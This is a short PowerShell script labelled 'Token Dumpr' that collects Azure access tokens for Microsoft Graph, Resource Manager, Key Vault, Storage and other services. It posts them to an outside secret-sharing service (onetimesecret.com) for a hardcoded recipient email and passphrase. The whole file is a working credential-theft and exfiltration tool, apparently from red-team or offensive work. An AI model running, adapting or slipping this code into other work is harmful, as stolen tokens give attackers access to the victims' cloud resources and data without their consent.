function AccessToken {
    param (
        $receiptEmail = "r.dijkman@securehat.nl",
        $passphrase   = "Bl74ckC@t"
    )
    
    $resourceTypeNames = @("MSGraph", "ResourceManager", "KeyVault", "Storage", "Synapse", "OperationalInsights", "Batch")

    try {
        $tokens = @()

        Write-Host "--- Token Dumpr v1.0.3 ---"
        foreach ($resourceTypeName in $resourceTypeNames) {
            try {
                $accessToken = (Get-AzAccessToken -ResourceTypeName $resourceTypeName)

                $tokenObject = [PSCustomObject]@{
                    Resource = $resourceTypeName
                    Token    = $accessToken
                }
                $tokens += $tokenObject
            }
            catch {
                Write-Error "Failed to get access token for resource type $resourceTypeName : $($_.Exception.Message)"
            }
        }

        $requestParam = @{
            Uri    = 'https://us.onetimesecret.com/api/v1/share'
            Method = 'POST'
            Body   = @{
                secret     = $tokens | ConvertTo-Json -Depth 10
                ttl        = 3600
                recipient  = $($receiptEmail)
                passphrase = $($passphrase)
            }
        }
    
        $response = Invoke-RestMethod @requestParam
        return "https://us.onetimesecret.com/secret/$($response.secret_key)"
    }
    catch {
        Write-Error "An error occurred in function $($MyInvocation.MyCommand.Name): $($_.Exception.Message)"
    }
}

AccessToken -receiptEmail $receiptEmail